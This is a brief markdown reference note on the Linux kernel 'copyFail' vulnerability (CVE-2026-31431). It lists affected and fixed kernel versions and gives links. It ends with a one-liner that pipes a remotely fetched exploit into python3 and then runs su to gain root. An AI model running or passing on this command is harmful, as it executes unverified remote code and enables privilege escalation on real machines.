---
title: "copyFail"
tags:
  - fetus
---
- CVE-2026-31431 (CVSS 7.8 HIGH)
	- https://nvd.nist.gov/vuln/detail/CVE-2026-31431
- writeup: https://xint.io/blog/copy-fail-linux-distributions
- affected kernel versions: 
	- Vulnerable: Linux kernel 4.14 through 7.0-rc, all 6.18.x prior to 6.18.22, and 6.19.x prior to 6.19.12 (regression introduced in 4.14, July 2017)
	- Fixed in: 7.0, 6.19.12, 6.18.22 
	- Vulnerable downstream distribution backports: Older LTS lines, such as 6.12.x, 6.6.x, 5.15.x, 5.10.x
- one liner:
```sh
curl https://copy.fail/exp | python3 && su
```
